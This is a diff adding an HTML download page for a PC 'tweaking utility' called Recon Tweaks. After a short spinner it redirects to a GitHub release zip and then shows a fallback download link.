@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Recon Tweaks - Downloading...</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #1e1e2f;
+            color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            animation: slideUp 1s ease-in-out;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(149, 99, 233, 0.2);
+            border-top: 6px solid #9563e9;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        .loading-text {
+            font-size: 1.2em;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+
+        .loading-subtext {
+            font-size: 0.9em;
+            color: #aaaaaa;
+            margin-bottom: 30px;
+        }
+
+        .loading-subtext a {
+            color: #9563e9;
+            text-decoration: none;
+        }
+
+        .purple-text {
+            color: #9563e9;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            0% { transform: translateY(20px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-page">
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="loading-text">Please wait while we download Recon Tweaking Utility to your PC.</div>
+        </div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            window.location.href = "https://github.com/hydragotcash/ReconTweaks/releases/download/v3.0-ReconTweaks/Recon.Optimizer.zip";
+        }, 1500);
+    </script>
+
+    <script>
+        setTimeout(() => {
+            const linkContainer = document.createElement('div');
+            linkContainer.innerHTML = '<a href="https://github.com/hydragotcash/ReconTweaks/releases/download/v3.0-ReconTweaks/Recon.Optimizer.zip" class="loading-subtext" style="animation: slideUp 1s ease-in-out;"><span class="purple-text">File not downloading? Click here.</span></a>';
+            document.querySelector('.loading-container').appendChild(linkContainer.firstChild);
+        }, 3000);
+    </script>
+</body>
+</html>
